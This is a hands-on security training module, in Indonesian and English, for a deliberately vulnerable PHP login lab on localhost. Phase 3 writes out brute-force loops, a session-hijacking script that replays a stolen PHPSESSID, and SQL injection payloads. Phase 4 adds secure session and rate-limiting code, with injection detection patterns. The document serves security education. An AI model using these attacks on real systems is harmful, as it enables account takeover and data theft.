# 🎓 Panduan Pembelajaran: Broken Authentication Security Module

> **🎯 Learning Goal**: Memahami vulnerability authentication secara mendalam melalui hands-on practice  
> **👥 Target Audience**: Students, developers, security professionals  
> **⏱️ Estimated Time**: 2-4 hours untuk complete learning  
> **📋 Prerequisites**: Basic web development knowledge, command line familiarity  

---

## 🌟 Learning Objectives

Setelah menyelesaikan modul ini, Anda akan mampu:

### 🎯 **Primary Goals**
1. **Mengidentifikasi** berbagai jenis authentication vulnerabilities
2. **Mengeksploitasi** kerentanan dengan tools dan techniques yang aman
3. **Memahami** dampak dari setiap vulnerability terhadap security
4. **Mengimplementasikan** secure coding practices untuk mitigation
5. **Menggunakan** automated tools untuk vulnerability assessment

### 🔍 **Specific Learning Outcomes**
- [ ] Memahami perbedaan Session ID vs Cookies
- [ ] Melakukan brute force attack dan memahami mitigasinya
- [ ] Mengeksploitasi session hijacking vulnerabilities
- [ ] Mendeteksi dan exploit SQL injection
- [ ] Menganalisis cookie security configurations
- [ ] Menulis secure authentication code
- [ ] Menggunakan penetration testing tools

---

## 📚 Modul Overview

### 🏗️ **Struktur Learning Module**

```
🔓 Broken Authentication Learning Module
├── 📖 Theory & Concepts (30 min)
├── 🛠️ Hands-on Lab Setup (15 min)
├── 🎯 Practical Exploitation (90 min)
├── 🛡️ Security Implementation (60 min)
└── 📝 Assessment & Review (15 min)
```

### 🎭 **Learning Roles**

Dalam modul ini, Anda akan berperan sebagai:
- **🕵️ Security Researcher**: Menganalisis dan menemukan vulnerability
- **🏴‍☠️ Ethical Hacker**: Mengeksploitasi kerentanan untuk pembelajaran
- **🛡️ Security Engineer**: Mengimplementasikan mitigation dan defense
- **👨‍💻 Secure Developer**: Menulis code yang aman dan robust

---

## 📖 Phase 1: Theory & Foundation (30 menit)

### 🎯 **Learning Goal**: Memahami konsep dasar authentication security

#### **Step 1.1: Baca Material Dasar (10 min)**
```bash
# Baca dokumentasi foundational
cat Discussion.md | head -100
```

**📋 Checklist Pemahaman:**
- [ ] Perbedaan Session ID dan Cookies
- [ ] Cara kerja session management
- [ ] Jenis-jenis authentication vulnerabilities
- [ ] OWASP Top 10 kategori yang relevan

#### **Step 1.2: Analisis Vulnerable Code (10 min)**
```bash
# Examine aplikasi source code
ls src/
cat src/config.php | grep -A5 -B5 "session"
cat src/index.php | grep -A10 -B5 "password"
```

**🔍 Yang Harus Dipahami:**
- Kenapa `ini_set('session.cookie_httponly', 0)` berbahaya?
- Mengapa `$user['password'] === $password` tidak aman?
- Bagaimana session management yang benar?

#### **Step 1.3: Review Attack Vectors (10 min)**
```bash
# Baca attack scenarios
cat ATTACK_SCENARIOS.md | grep -A5 "Vulnerability"
```

**🎯 Focus Areas:**
- Brute Force Attack mechanics
- Session Hijacking techniques  
- SQL Injection patterns
- Session Fixation concepts

---

## 🛠️ Phase 2: Lab Setup & Environment (15 menit)

### 🎯 **Learning Goal**: Menyiapkan environment testing yang aman

#### **Step 2.1: Environment Verification (5 min)**
```bash
# Verify Docker is running
docker --version
docker-compose --version

# Check if application is accessible
curl -I http://localhost:8081
```

**✅ Expected Output:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian) PHP/8.1.33
Set-Cookie: PHPSESSID=...; path=/
```

#### **Step 2.2: Testing Tools Setup (5 min)**
```bash
# Verify Python environment
python3 --version
pip3 list | grep requests

# Make scripts executable
chmod +x run_tests.sh
chmod +x *.py

# Test basic connectivity
./run_tests.sh --auto | head -20
```

#### **Step 2.3: Baseline Security Scan (5 min)**
```bash
# Run quick vulnerability assessment
echo "=== BASELINE SECURITY SCAN ==="
curl -s http://localhost:8081 | grep -i "session.*console.log"
curl -s -I http://localhost:8081 | grep -i "set-cookie"
```

**📋 Document Findings:**
- Session ID exposure: [ ] Yes [ ] No
- Cookie security flags: [ ] Secure [ ] Insecure
- Application availability: [ ] Ready [ ] Issues

---

## 🎯 Phase 3: Practical Exploitation (90 menit)

### 🎯 **Learning Goal**: Hands-on exploitation untuk memahami real-world impact

#### **🔓 Lab 3.1: Brute Force Attack (25 min)**

**Objective**: Memahami dampak tidak adanya rate limiting

**Step 1: Manual Testing (10 min)**
```bash
echo "=== MANUAL BRUTE FORCE TEST ==="

# Test valid credentials
curl -X POST http://localhost:8081/index.php \
  -d "username=admin&password=admin" \
  -s | grep -i "login successful\|welcome\|invalid"

# Test invalid credentials  
curl -X POST http://localhost:8081/index.php \
  -d "username=admin&password=wrong" \
  -s | grep -i "login successful\|welcome\|invalid"

# Test multiple attempts (no rate limiting)
for i in {1..5}; do
  echo "Attempt $i:"
  curl -X POST http://localhost:8081/index.php \
    -d "username=admin&password=wrong$i" \
    -s | grep -i "invalid" | head -1
done
```

**Step 2: Automated Attack (10 min)**
```bash
# Run automated brute force
python3 -c "
import requests
import time

credentials = [('admin', 'admin'), ('john', 'password'), ('jane', '123456')]
base_url = 'http://localhost:8081/index.php'

print('🔓 BRUTE FORCE ATTACK SIMULATION')
print('================================')

for username, password in credentials:
    print(f'Testing: {username}:{password}')
    
    response = requests.post(base_url, data={
        'username': username,
        'password': password
    })
    
    if 'Login successful' in response.text or 'Welcome' in response.text:
        print(f'  ✅ SUCCESS: {username}:{password}')
    else:
        print(f'  ❌ Failed')
    
    time.sleep(0.5)
"
```

**Step 3: Impact Analysis (5 min)**
```bash
# Analyze attack success
echo "=== BRUTE FORCE IMPACT ANALYSIS ==="
echo "1. No rate limiting detected"
echo "2. No account lockout mechanism"  
echo "3. Weak passwords easily cracked"
echo "4. No CAPTCHA or additional protection"
```

**📝 Learning Questions:**
1. Berapa lama waktu untuk crack 4 accounts?
2. Apa saja indikator successful login?
3. Mitigation apa yang paling efektif?

#### **🍪 Lab 3.2: Session Security Analysis (25 min)**

**Objective**: Memahami session management vulnerabilities

**Step 1: Cookie Analysis (10 min)**
```bash
echo "=== COOKIE SECURITY ANALYSIS ==="

# Get session cookie
curl -c session_cookies.txt -s http://localhost:8081 > /dev/null

# Analyze cookie properties
echo "Session Cookie Details:"
cat session_cookies.txt | grep PHPSESSID

# Check security flags
curl -I http://localhost:8081 2>/dev/null | grep -i "set-cookie"
```

**Step 2: Session Hijacking Demo (10 min)**
```bash
# Simulate session hijacking
echo "=== SESSION HIJACKING SIMULATION ==="

# Step 1: Victim login
victim_response=$(curl -X POST http://localhost:8081/index.php \
  -d "username=john&password=password" \
  -c victim_cookies.txt -s)

if echo "$victim_response" | grep -q "Login successful"; then
  echo "✅ Victim logged in successfully"
  
  # Extract victim's session ID
  victim_session=$(grep PHPSESSID victim_cookies.txt | cut -f7)
  echo "🍪 Victim's Session ID: $victim_session"
  
  # Step 2: Attacker uses stolen session
  echo "🏴‍☠️ Attacker using stolen session..."
  attacker_response=$(curl -b "PHPSESSID=$victim_session" \
    http://localhost:8081/profile.php -s)
  
  if echo "$attacker_response" | grep -q -i "profile\|john"; then
    echo "🚨 HIJACK SUCCESSFUL! Attacker accessed victim's account"
  else
    echo "❌ Session hijacking failed"
  fi
else
  echo "❌ Victim login failed"
fi

# Cleanup
rm -f victim_cookies.txt
```

**Step 3: JavaScript Session Exposure (5 min)**
```bash
# Check for session exposure in JavaScript
echo "=== JAVASCRIPT SESSION EXPOSURE ==="
curl -s http://localhost:8081 | grep -A2 -B2 "console.log.*session"
```

**📝 Learning Questions:**
1. Apa saja cookie security flags yang missing?
2. Bagaimana attacker bisa mendapatkan session ID?
3. Mengapa session hijacking berhasil?

#### **💉 Lab 3.3: SQL Injection Discovery (25 min)**

**Objective**: Menemukan dan mengeksploitasi SQL injection

**Step 1: Error Discovery (10 min)**
```bash
echo "=== SQL INJECTION DISCOVERY ==="

# Test basic SQL injection payload
echo "Testing basic payload: admin'"
curl -X POST http://localhost:8081/index.php \
  -d "username=admin'&password=test" \
  -s | grep -i "error\|exception\|mysql" | head -3

echo ""
echo "Testing comment injection: admin'--"
curl -X POST http://localhost:8081/index.php \
  -d "username=admin'--&password=anything" \
  -s | grep -i "error\|exception\|mysql" | head -3
```

**Step 2: Information Gathering (10 min)**
```bash
# Extract database information from errors
echo "=== DATABASE INFORMATION EXTRACTION ==="

payloads=(
  "admin'"
  "admin'--"
  "' OR '1'='1'--"
)

for payload in "${payloads[@]}"; do
  echo "Testing payload: $payload"
  response=$(curl -X POST http://localhost:8081/index.php \
    -d "username=$payload&password=test" -s)
  
  # Look for database errors
  if echo "$response" | grep -q -i "pdoexception\|mysql\|sql"; then
    echo "  🚨 SQL Error detected!"
    echo "$response" | grep -i "pdoexception\|mysql\|sql" | head -1
  else
    echo "  ✅ No SQL error"
  fi
  echo ""
done
```

**Step 3: Automated SQL Testing (5 min)**
```bash
# Run comprehensive SQL injection test
python3 sql_injection_tester.py | head -50
```

**📝 Learning Questions:**
1. Apa informasi yang terekspos dari error messages?
2. Mengapa prepared statements tidak mencegah error ini?
3. Bagaimana cara exploit error-based SQL injection?

#### **🔗 Lab 3.4: Session Fixation Analysis (15 min)**

**Objective**: Memahami mengapa session fixation tidak bekerja

**Step 1: Test Session Fixation (10 min)**
```bash
echo "=== SESSION FIXATION TESTING ==="

# Try to set custom session ID
custom_session="ATTACKER_CONTROLLED_SESSION_123"
echo "Attempting to set session ID: $custom_session"

response=$(curl "http://localhost:8081?sessionid=$custom_session" -s)

# Check for errors
if echo "$response" | grep -q "session_id.*cannot be changed"; then
  echo "⚠️  Session fixation blocked by PHP error"
  echo "Implementation flaw prevents attack"
else
  echo "🚨 Session fixation might be possible"
fi
```

**Step 2: Code Analysis (5 min)**
```bash
# Analyze why session fixation doesn't work
echo "=== CODE ANALYSIS ==="
echo "Problem: session_start() called in config.php before index.php"
echo ""
echo "Config.php (line 22):"
grep -n "session_start" src/config.php
echo ""
echo "Index.php (lines 8-10):"
grep -A3 -B1 "sessionid" src/index.php
```

**📝 Learning Questions:**
1. Mengapa session fixation tidak bekerja?
2. Bagaimana seharusnya implementasi yang benar?
3. Apa pembelajaran dari bug ini?

---

## 🛡️ Phase 4: Security Implementation (60 menit)

### 🎯 **Learning Goal**: Mengimplementasikan secure authentication practices

#### **🔒 Lab 4.1: Secure Session Configuration (20 min)**

**Objective**: Membuat secure session management

**Step 1: Create Secure Config (10 min)**
```bash
# Create secure session configuration
cat > secure_session_config.php << 'EOF'
<?php
// Secure Session Configuration
// DO NOT use in the vulnerable app - this is for learning

// Secure session settings
ini_set('session.cookie_httponly', 1);     // Prevent XSS access
ini_set('session.cookie_secure', 1);       // HTTPS only
ini_set('session.use_strict_mode', 1);     // Prevent fixation
ini_set('session.cookie_samesite', 'Strict'); // CSRF protection
ini_set('session.gc_maxlifetime', 3600);   // 1 hour timeout

// Custom secure session start
function secure_session_start() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
        
        // Regenerate session ID periodically
        if (!isset($_SESSION['last_regeneration'])) {
            $_SESSION['last_regeneration'] = time();
        } elseif (time() - $_SESSION['last_regeneration'] > 300) {
            session_regenerate_id(true);
            $_SESSION['last_regeneration'] = time();
        }
    }
}

// Login function with security measures
function secure_login($username, $password) {
    // Rate limiting check
    if (!check_rate_limit($username, $_SERVER['REMOTE_ADDR'])) {
        return ['success' => false, 'error' => 'Too many attempts. Try again later.'];
    }
    
    // Validate input
    if (!validate_credentials($username, $password)) {
        log_login_attempt($username, $_SERVER['REMOTE_ADDR'], false);
        return ['success' => false, 'error' => 'Invalid credentials.'];
    }
    
    // Verify password with hash
    $user = get_user_secure($username);
    if ($user && password_verify($password, $user['password_hash'])) {
        // Regenerate session ID after successful login
        session_regenerate_id(true);
        
        // Set session variables
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['login_time'] = time();
        $_SESSION['last_activity'] = time();
        
        log_login_attempt($username, $_SERVER['REMOTE_ADDR'], true);
        return ['success' => true, 'user' => $user];
    }
    
    log_login_attempt($username, $_SERVER['REMOTE_ADDR'], false);
    return ['success' => false, 'error' => 'Invalid credentials.'];
}

function check_rate_limit($username, $ip) {
    // Implementation for rate limiting
    // Return false if too many attempts
    return true; // Simplified for example
}

function validate_credentials($username, $password) {
    // Input validation
    if (strlen($username) < 3 || strlen($username) > 50) return false;
    if (strlen($password) < 8) return false;
    if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) return false;
    return true;
}

function get_user_secure($username) {
    // Use prepared statements (already implemented in app)
    global $pdo;
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function log_login_attempt($username, $ip, $success) {
    // Enhanced logging
    $log_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'username' => $username,
        'ip' => $ip,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'success' => $success ? 1 : 0
    ];
    
    error_log("Login attempt: " . json_encode($log_data));
}
?>
EOF

echo "✅ Secure session configuration created"
```

**Step 2: Password Security Implementation (10 min)**
```bash
# Create secure password handling
cat > secure_password_example.php << 'EOF'
<?php
// Secure Password Handling Examples

// Password hashing
function hash_password($password) {
    // Use Argon2ID for maximum security
    return password_hash($password, PASSWORD_ARGON2ID, [
        'memory_cost' => 65536, // 64 MB
        'time_cost' => 4,       // 4 iterations
        'threads' => 3          // 3 threads
    ]);
}

// Password verification
function verify_password($password, $hash) {
    return password_verify($password, $hash);
}

// Password strength validation
function validate_password_strength($password) {
    $errors = [];
    
    if (strlen($password) < 12) {
        $errors[] = "Password must be at least 12 characters long";
    }
    
    if (!preg_match('/[A-Z]/', $password)) {
        $errors[] = "Password must contain at least one uppercase letter";
    }
    
    if (!preg_match('/[a-z]/', $password)) {
        $errors[] = "Password must contain at least one lowercase letter";
    }
    
    if (!preg_match('/[0-9]/', $password)) {
        $errors[] = "Password must contain at least one number";
    }
    
    if (!preg_match('/[^A-Za-z0-9]/', $password)) {
        $errors[] = "Password must contain at least one special character";
    }
    
    // Check against common passwords
    $common_passwords = ['password', '123456', 'qwerty', 'admin'];
    if (in_array(strtolower($password), $common_passwords)) {
        $errors[] = "Password is too common";
    }
    
    return empty($errors) ? true : $errors;
}

// Example usage
$password = "SecureP@ssw0rd2024!";
$validation = validate_password_strength($password);

if ($validation === true) {
    $hash = hash_password($password);
    echo "✅ Strong password hashed successfully\n";
    echo "Hash: " . substr($hash, 0, 50) . "...\n";
    
    // Verify password
    if (verify_password($password, $hash)) {
        echo "✅ Password verification successful\n";
    }
} else {
    echo "❌ Password validation failed:\n";
    foreach ($validation as $error) {
        echo "  - $error\n";
    }
}
?>
EOF

php secure_password_example.php
```

#### **🛡️ Lab 4.2: Rate Limiting Implementation (20 min)**

**Objective**: Implementasi rate limiting untuk mencegah brute force

**Step 1: Database Schema for Rate Limiting (5 min)**
```bash
# Create rate limiting table schema
cat > rate_limiting_schema.sql << 'EOF'
-- Rate limiting table for tracking login attempts
CREATE TABLE login_rate_limit (
    id INT AUTO_INCREMENT PRIMARY KEY,
    identifier VARCHAR(255) NOT NULL, -- IP or username
    attempt_count INT DEFAULT 1,
    first_attempt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_attempt TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    locked_until TIMESTAMP NULL,
    INDEX idx_identifier (identifier),
    INDEX idx_locked_until (locked_until)
);

-- Failed login attempts log
CREATE TABLE failed_login_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100),
    ip_address VARCHAR(45),
    user_agent TEXT,
    attempt_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    failure_reason VARCHAR(255),
    INDEX idx_username (username),
    INDEX idx_ip (ip_address),
    INDEX idx_attempt_time (attempt_time)
);
EOF

echo "✅ Rate limiting schema created"
```

**Step 2: Rate Limiting Logic (15 min)**
```bash
# Create rate limiting implementation
cat > rate_limiting_implementation.php << 'EOF'
<?php
// Rate Limiting Implementation

class RateLimiter {
    private $pdo;
    private $max_attempts;
    private $lockout_duration;
    private $time_window;
    
    public function __construct($pdo, $max_attempts = 5, $lockout_duration = 900, $time_window = 300) {
        $this->pdo = $pdo;
        $this->max_attempts = $max_attempts;
        $this->lockout_duration = $lockout_duration; // 15 minutes
        $this->time_window = $time_window; // 5 minutes
    }
    
    public function check_rate_limit($identifier) {
        // Clean up old entries
        $this->cleanup_old_entries();
        
        // Check if currently locked
        if ($this->is_locked($identifier)) {
            return [
                'allowed' => false,
                'reason' => 'Account temporarily locked due to too many failed attempts',
                'retry_after' => $this->get_lockout_remaining($identifier)
            ];
        }
        
        // Check attempt count within time window
        $attempts = $this->get_attempt_count($identifier);
        
        if ($attempts >= $this->max_attempts) {
            // Lock the account
            $this->lock_account($identifier);
            return [
                'allowed' => false,
                'reason' => 'Too many attempts. Account locked.',
                'retry_after' => $this->lockout_duration
            ];
        }
        
        return [
            'allowed' => true,
            'remaining_attempts' => $this->max_attempts - $attempts
        ];
    }
    
    public function record_attempt($identifier, $success = false) {
        if ($success) {
            // Clear rate limiting on successful login
            $this->clear_attempts($identifier);
        } else {
            // Record failed attempt
            $this->increment_attempts($identifier);
        }
    }
    
    private function is_locked($identifier) {
        $stmt = $this->pdo->prepare("
            SELECT locked_until 
            FROM login_rate_limit 
            WHERE identifier = ? AND locked_until > NOW()
        ");
        $stmt->execute([$identifier]);
        return $stmt->rowCount() > 0;
    }
    
    private function get_lockout_remaining($identifier) {
        $stmt = $this->pdo->prepare("
            SELECT TIMESTAMPDIFF(SECOND, NOW(), locked_until) as remaining
            FROM login_rate_limit 
            WHERE identifier = ? AND locked_until > NOW()
        ");
        $stmt->execute([$identifier]);
        $result = $stmt->fetch();
        return $result ? $result['remaining'] : 0;
    }
    
    private function get_attempt_count($identifier) {
        $stmt = $this->pdo->prepare("
            SELECT attempt_count 
            FROM login_rate_limit 
            WHERE identifier = ? AND first_attempt > DATE_SUB(NOW(), INTERVAL ? SECOND)
        ");
        $stmt->execute([$identifier, $this->time_window]);
        $result = $stmt->fetch();
        return $result ? $result['attempt_count'] : 0;
    }
    
    private function increment_attempts($identifier) {
        $stmt = $this->pdo->prepare("
            INSERT INTO login_rate_limit (identifier, attempt_count, first_attempt) 
            VALUES (?, 1, NOW())
            ON DUPLICATE KEY UPDATE 
                attempt_count = attempt_count + 1,
                last_attempt = NOW()
        ");
        $stmt->execute([$identifier]);
    }
    
    private function lock_account($identifier) {
        $stmt = $this->pdo->prepare("
            UPDATE login_rate_limit 
            SET locked_until = DATE_ADD(NOW(), INTERVAL ? SECOND)
            WHERE identifier = ?
        ");
        $stmt->execute([$this->lockout_duration, $identifier]);
    }
    
    private function clear_attempts($identifier) {
        $stmt = $this->pdo->prepare("DELETE FROM login_rate_limit WHERE identifier = ?");
        $stmt->execute([$identifier]);
    }
    
    private function cleanup_old_entries() {
        $stmt = $this->pdo->prepare("
            DELETE FROM login_rate_limit 
            WHERE locked_until < NOW() AND locked_until IS NOT NULL
        ");
        $stmt->execute();
    }
}

// Usage example
/*
$rate_limiter = new RateLimiter($pdo);
$identifier = $_SERVER['REMOTE_ADDR'] . ':' . $username; // Combine IP and username

$rate_check = $rate_limiter->check_rate_limit($identifier);
if (!$rate_check['allowed']) {
    // Return rate limit error
    echo "Rate limited: " . $rate_check['reason'];
    exit;
}

// Proceed with authentication
$login_success = authenticate_user($username, $password);
$rate_limiter->record_attempt($identifier, $login_success);
*/
?>
EOF

echo "✅ Rate limiting implementation created"
```

#### **🔐 Lab 4.3: Input Validation & Sanitization (20 min)**

**Objective**: Implementasi proper input validation

**Step 1: Input Validation Framework (10 min)**
```bash
# Create input validation framework
cat > input_validation.php << 'EOF'
<?php
// Comprehensive Input Validation Framework

class InputValidator {
    
    public static function validate_username($username) {
        $errors = [];
        
        // Length check
        if (strlen($username) < 3) {
            $errors[] = "Username must be at least 3 characters";
        }
        if (strlen($username) > 50) {
            $errors[] = "Username must not exceed 50 characters";
        }
        
        // Character validation
        if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $username)) {
            $errors[] = "Username can only contain letters, numbers, underscore, dot, and dash";
        }
        
        // Reserved names check
        $reserved = ['admin', 'administrator', 'root', 'system', 'null', 'undefined'];
        if (in_array(strtolower($username), $reserved)) {
            $errors[] = "Username is reserved";
        }
        
        return empty($errors) ? true : $errors;
    }
    
    public static function validate_password($password) {
        $errors = [];
        
        // Length check
        if (strlen($password) < 8) {
            $errors[] = "Password must be at least 8 characters";
        }
        if (strlen($password) > 128) {
            $errors[] = "Password must not exceed 128 characters";
        }
        
        // Complexity check
        $complexity_score = 0;
        if (preg_match('/[a-z]/', $password)) $complexity_score++;
        if (preg_match('/[A-Z]/', $password)) $complexity_score++;
        if (preg_match('/[0-9]/', $password)) $complexity_score++;
        if (preg_match('/[^A-Za-z0-9]/', $password)) $complexity_score++;
        
        if ($complexity_score < 3) {
            $errors[] = "Password must contain at least 3 of: lowercase, uppercase, numbers, special characters";
        }
        
        // Common password check
        if (self::is_common_password($password)) {
            $errors[] = "Password is too common";
        }
        
        return empty($errors) ? true : $errors;
    }
    
    public static function sanitize_input($input, $type = 'string') {
        switch ($type) {
            case 'string':
                return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
            case 'email':
                return filter_var(trim($input), FILTER_SANITIZE_EMAIL);
            case 'int':
                return filter_var($input, FILTER_SANITIZE_NUMBER_INT);
            case 'url':
                return filter_var(trim($input), FILTER_SANITIZE_URL);
            default:
                return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
        }
    }
    
    public static function validate_email($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return ["Invalid email format"];
        }
        
        if (strlen($email) > 254) {
            return ["Email address too long"];
        }
        
        return true;
    }
    
    public static function prevent_sql_injection($input) {
        // Additional layer of protection (should use prepared statements)
        $dangerous_patterns = [
            '/(\s*(;|\'|"|`|\||&|\$))/i',
            '/(union|select|insert|update|delete|drop|create|alter)/i',
            '/(-{2}|\/\*|\*\/)/i',
            '/(script|javascript|vbscript|onload|onerror)/i'
        ];
        
        foreach ($dangerous_patterns as $pattern) {
            if (preg_match($pattern, $input)) {
                return false; // Potentially malicious input
            }
        }
        
        return true;
    }
    
    private static function is_common_password($password) {
        $common_passwords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin', 'letmein', 'welcome', '123123'
        ];
        
        return in_array(strtolower($password), $common_passwords);
    }
}

// Example usage and testing
echo "=== INPUT VALIDATION TESTING ===\n";

// Test username validation
$test_usernames = ['validuser', 'a', 'user@invalid', 'admin', 'verylongusernamethatexceedslimit'];
foreach ($test_usernames as $username) {
    $result = InputValidator::validate_username($username);
    echo "Username '$username': " . ($result === true ? "✅ Valid" : "❌ " . implode(", ", $result)) . "\n";
}

echo "\n";

// Test password validation
$test_passwords = ['weak', 'StrongPass123!', 'password', 'Complex!Password123'];
foreach ($test_passwords as $password) {
    $result = InputValidator::validate_password($password);
    echo "Password '$password': " . ($result === true ? "✅ Valid" : "❌ " . implode(", ", $result)) . "\n";
}

echo "\n";

// Test SQL injection prevention
$test_inputs = ["normal input", "'; DROP TABLE users;--", "admin' OR '1'='1", "normal string"];
foreach ($test_inputs as $input) {
    $safe = InputValidator::prevent_sql_injection($input);
    echo "Input '$input': " . ($safe ? "✅ Safe" : "🚨 Potentially malicious") . "\n";
}
?>
EOF

php input_validation.php
```

**Step 2: Security Headers Implementation (10 min)**
```bash
# Create security headers implementation
cat > security_headers.php << 'EOF'
<?php
// Security Headers Implementation

class SecurityHeaders {
    
    public static function set_security_headers() {
        // Prevent XSS attacks
        header('X-Content-Type-Options: nosniff');
        header('X-Frame-Options: DENY');
        header('X-XSS-Protection: 1; mode=block');
        
        // HTTPS enforcement
        header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
        
        // Content Security Policy
        header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';");
        
        // Referrer Policy
        header('Referrer-Policy: strict-origin-when-cross-origin');
        
        // Feature Policy
        header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
        
        // Hide server information
        header_remove('X-Powered-By');
        header_remove('Server');
        
        // Cache control for sensitive pages
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
    }
    
    public static function set_secure_session_cookies() {
        // Set secure session cookie parameters
        $secure = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on';
        
        session_set_cookie_params([
            'lifetime' => 3600, // 1 hour
            'path' => '/',
            'domain' => '', // Current domain
            'secure' => $secure, // HTTPS only
            'httponly' => true, // No JavaScript access
            'samesite' => 'Strict' // CSRF protection
        ]);
    }
    
    public static function validate_csrf_token($token) {
        if (!isset($_SESSION['csrf_token'])) {
            return false;
        }
        
        return hash_equals($_SESSION['csrf_token'], $token);
    }
    
    public static function generate_csrf_token() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }
}

// Example usage
echo "=== SECURITY HEADERS EXAMPLE ===\n";
echo "Security headers would be set in HTTP response:\n\n";

$headers = [
    'X-Content-Type-Options: nosniff',
    'X-Frame-Options: DENY', 
    'X-XSS-Protection: 1; mode=block',
    'Strict-Transport-Security: max-age=31536000; includeSubDomains',
    'Content-Security-Policy: default-src \'self\'',
    'Referrer-Policy: strict-origin-when-cross-origin'
];

foreach ($headers as $header) {
    echo "✅ $header\n";
}

echo "\n=== CSRF TOKEN EXAMPLE ===\n";
session_start();
$csrf_token = SecurityHeaders::generate_csrf_token();
echo "Generated CSRF Token: " . substr($csrf_token, 0, 16) . "...\n";
?>
EOF

php security_headers.php
```

---

## 📝 Phase 5: Assessment & Review (15 menit)

### 🎯 **Learning Goal**: Validasi pemahaman dan reflection

#### **📋 Knowledge Check (10 min)**

**Self-Assessment Checklist:**

**Conceptual Understanding:**
- [ ] Dapat menjelaskan perbedaan Session ID dan Cookies
- [ ] Memahami cara kerja brute force attack
- [ ] Dapat mengidentifikasi session security vulnerabilities
- [ ] Memahami SQL injection error disclosure
- [ ] Dapat menjelaskan session fixation vulnerability

**Practical Skills:**
- [ ] Berhasil melakukan brute force attack
- [ ] Dapat mendemonstrasikan session hijacking
- [ ] Menemukan SQL injection vulnerability
- [ ] Menggunakan automated testing tools
- [ ] Menulis secure authentication code

**Security Implementation:**
- [ ] Dapat mengimplementasikan rate limiting
- [ ] Memahami secure session configuration
- [ ] Dapat menulis input validation
- [ ] Memahami password security best practices
- [ ] Dapat set security headers

#### **📝 Reflection Questions (5 min)**

**Answer these questions to consolidate your learning:**

1. **Vulnerability Impact**: Apa vulnerability yang paling berbahaya dan mengapa?

2. **Real-world Application**: Bagaimana Anda akan menerapkan learning ini di project nyata?

3. **Defense Strategy**: Mitigation mana yang paling efektif untuk mencegah multiple attacks?

4. **Tool Effectiveness**: Tool mana yang paling membantu dalam vulnerability discovery?

5. **Code Review**: Apa yang akan Anda cari saat review authentication code?

---

## 🎯 Learning Path Recommendations

### 🌟 **Beginner Path (First-time learners)**
1. Start with **Phase 1** (Theory) - 30 min
2. Complete **Phase 2** (Setup) - 15 min  
3. Focus on **Lab 3.1** (Brute Force) - 25 min
4. Try **Lab 3.2** (Session Security) - 25 min
5. Review **Phase 5** (Assessment) - 15 min

**Total Time**: ~2 hours

### 🚀 **Intermediate Path (Some security knowledge)**
1. Quick review **Phase 1** - 15 min
2. Complete **Phase 2** - 15 min
3. Complete all **Phase 3** labs - 90 min
4. Focus on **Lab 4.1** (Secure Config) - 20 min
5. Complete **Phase 5** - 15 min

**Total Time**: ~2.5 hours

### 🔥 **Advanced Path (Security professionals)**
1. Skip to **Phase 2** (Setup) - 15 min
2. Complete **Phase 3** (All labs) - 90 min
3. Complete **Phase 4** (All implementations) - 60 min
4. Advanced analysis and **Phase 5** - 15 min
5. Custom exploit development - 30 min

**Total Time**: ~3.5 hours

---

## 🔧 Troubleshooting Guide

### ❌ **Common Issues & Solutions**

#### **Application Not Starting**
```bash
# Check Docker status
docker-compose ps

# Restart if needed
docker-compose down && docker-compose up -d

# Check logs
docker-compose logs web
```

#### **Database Connection Issues**
```bash
# Verify database is running
docker exec broken-auth-db-1 mysql -u root -ppassword123 -e "SHOW DATABASES;"

# Restart database
docker-compose restart db
```

#### **Python Script Errors**
```bash
# Install missing dependencies
pip3 install requests

# Check Python version
python3 --version  # Should be 3.6+

# Run with verbose output
python3 -v attack_testing_suite.py
```

#### **Permission Denied**
```bash
# Make scripts executable
chmod +x run_tests.sh
chmod +x *.py

# Check file ownership
ls -la *.sh *.py
```

### 🆘 **Getting Help**

1. **Check logs**: `docker-compose logs`
2. **Verify network**: `curl http://localhost:8081`
3. **Test connectivity**: `./run_tests.sh` option 1
4. **Review documentation**: `cat README.md`
5. **Check issues**: GitHub repository issues section

---

## 🏆 Completion Certificate

### 📜 **Learning Achievement**

After completing this module, you have demonstrated:

✅ **Vulnerability Identification**: Successfully identified 6+ authentication vulnerabilities  
✅ **Practical Exploitation**: Performed hands-on attacks on vulnerable application  
✅ **Security Implementation**: Created secure authentication code examples  
✅ **Tool Proficiency**: Used automated testing tools effectively  
✅ **Risk Assessment**: Understood impact and risk levels of vulnerabilities  

### 🎯 **Next Steps**

Continue your cybersecurity journey with:
- **Advanced Web Security**: OWASP Top 10 deep dive
- **Penetration Testing**: Professional pen-testing methodologies  
- **Secure Development**: Security-by-design principles
- **Incident Response**: Handling security breaches
- **Compliance**: Security frameworks and standards

---

## 📚 Additional Resources

### 🔗 **Essential Reading**
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
